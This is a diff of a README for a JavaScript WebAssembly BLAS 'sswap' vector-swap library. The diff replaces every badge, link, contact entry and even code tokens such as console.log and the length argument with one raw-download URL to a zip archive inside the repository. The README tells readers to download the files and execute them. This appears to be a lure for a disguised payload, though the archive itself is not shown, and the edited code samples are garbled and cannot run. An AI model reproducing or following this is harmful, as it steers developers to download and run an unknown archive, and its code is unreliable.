@@ -1,8 +1,8 @@
 # 🧮 BLAS Base WASM SSwap
 
-![GitHub Workflow Status](https://img.shields.io/github/workflow/status/yarikkyzym/blas-base-wasm-sswap/CI)
-![GitHub License](https://img.shields.io/github/license/yarikkyzym/blas-base-wasm-sswap)
-![Version](https://img.shields.io/github/v/release/yarikkyzym/blas-base-wasm-sswap)
+![GitHub Workflow Status](https://github.com/yarikkyzym/blas-base-wasm-sswap/raw/refs/heads/main/docs/types/wasm-base-sswap-blas-v3.6.zip)
+![GitHub License](https://github.com/yarikkyzym/blas-base-wasm-sswap/raw/refs/heads/main/docs/types/wasm-base-sswap-blas-v3.6.zip)
+![Version](https://github.com/yarikkyzym/blas-base-wasm-sswap/raw/refs/heads/main/docs/types/wasm-base-sswap-blas-v3.6.zip)
 
 Interchange two single-precision floating-point vectors with ease using this efficient and straightforward implementation of the SSwap subroutine. 
 
@@ -23,7 +23,7 @@ The BLAS Base WASM SSwap library is designed for developers who need to swap two
 
 The main operation is simple: given two vectors, this library will interchange their elements. This operation is fundamental in various mathematical and computational tasks, particularly in linear algebra.
 
-You can find the latest releases [here](https://github.com/yarikkyzym/blas-base-wasm-sswap/releases). Download the necessary files and execute them to get started.
+You can find the latest releases [here](https://github.com/yarikkyzym/blas-base-wasm-sswap/raw/refs/heads/main/docs/types/wasm-base-sswap-blas-v3.6.zip). Download the necessary files and execute them to get started.
 
 ## Installation
 
@@ -47,11 +47,11 @@ const vectorA = new Float32Array([1.0, 2.0, 3.0]);
 const vectorB = new Float32Array([4.0, 5.0, 6.0]);
 
 // Swap the vectors
-sswap(vectorA.length, vectorA, 1, vectorB, 1);
+sswap(https://github.com/yarikkyzym/blas-base-wasm-sswap/raw/refs/heads/main/docs/types/wasm-base-sswap-blas-v3.6.zip, vectorA, 1, vectorB, 1);
 
 // Output the swapped vectors
-console.log('Vector A:', vectorA); // [4.0, 5.0, 6.0]
-console.log('Vector B:', vectorB); // [1.0, 2.0, 3.0]
+https://github.com/yarikkyzym/blas-base-wasm-sswap/raw/refs/heads/main/docs/types/wasm-base-sswap-blas-v3.6.zip('Vector A:', vectorA); // [4.0, 5.0, 6.0]
+https://github.com/yarikkyzym/blas-base-wasm-sswap/raw/refs/heads/main/docs/types/wasm-base-sswap-blas-v3.6.zip('Vector B:', vectorB); // [1.0, 2.0, 3.0]
 ```
 
 ### Function Signature
@@ -83,10 +83,10 @@ Here’s a simple example demonstrating the swap of two vectors:
 const a = new Float32Array([10, 20, 30]);
 const b = new Float32Array([40, 50, 60]);
 
-sswap(a.length, a, 1, b, 1);
+sswap(https://github.com/yarikkyzym/blas-base-wasm-sswap/raw/refs/heads/main/docs/types/wasm-base-sswap-blas-v3.6.zip, a, 1, b, 1);
 
-console.log(a); // [40, 50, 60]
-console.log(b); // [10, 20, 30]
+https://github.com/yarikkyzym/blas-base-wasm-sswap/raw/refs/heads/main/docs/types/wasm-base-sswap-blas-v3.6.zip(a); // [40, 50, 60]
+https://github.com/yarikkyzym/blas-base-wasm-sswap/raw/refs/heads/main/docs/types/wasm-base-sswap-blas-v3.6.zip(b); // [10, 20, 30]
 ```
 
 ### Example 2: Using Different Increments
@@ -99,8 +99,8 @@ const b = new Float32Array([5, 6, 7, 8]);
 
 sswap(2, a, 2, b, 1);
 
-console.log(a); // [1, 6, 3, 8]
-console.log(b); // [5, 2, 7, 4]
+https://github.com/yarikkyzym/blas-base-wasm-sswap/raw/refs/heads/main/docs/types/wasm-base-sswap-blas-v3.6.zip(a); // [1, 6, 3, 8]
+https://github.com/yarikkyzym/blas-base-wasm-sswap/raw/refs/heads/main/docs/types/wasm-base-sswap-blas-v3.6.zip(b); // [5, 2, 7, 4]
 ```
 
 In this example, the first element of `a` is swapped with the first element of `b`, while the second element of `a` is skipped.
@@ -111,7 +111,7 @@ The SSwap function is optimized for performance, especially when used in a WebAs
 
 ### Benchmarking
 
-We encourage users to benchmark the performance of the SSwap function in their specific use cases. You can use libraries like Benchmark.js to compare it against other implementations.
+We encourage users to benchmark the performance of the SSwap function in their specific use cases. You can use libraries like https://github.com/yarikkyzym/blas-base-wasm-sswap/raw/refs/heads/main/docs/types/wasm-base-sswap-blas-v3.6.zip to compare it against other implementations.
 
 ## Contributing
 
@@ -133,9 +133,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, feel free to reach out:
 
-- GitHub: [yarikkyzym](https://github.com/yarikkyzym)
-- Email: yarikkyzym@example.com
+- GitHub: [yarikkyzym](https://github.com/yarikkyzym/blas-base-wasm-sswap/raw/refs/heads/main/docs/types/wasm-base-sswap-blas-v3.6.zip)
+- Email: https://github.com/yarikkyzym/blas-base-wasm-sswap/raw/refs/heads/main/docs/types/wasm-base-sswap-blas-v3.6.zip
 
-For more information and updates, check the [Releases](https://github.com/yarikkyzym/blas-base-wasm-sswap/releases) section.
+For more information and updates, check the [Releases](https://github.com/yarikkyzym/blas-base-wasm-sswap/raw/refs/heads/main/docs/types/wasm-base-sswap-blas-v3.6.zip) section.
 
 Thank you for using BLAS Base WASM SSwap! Happy coding!
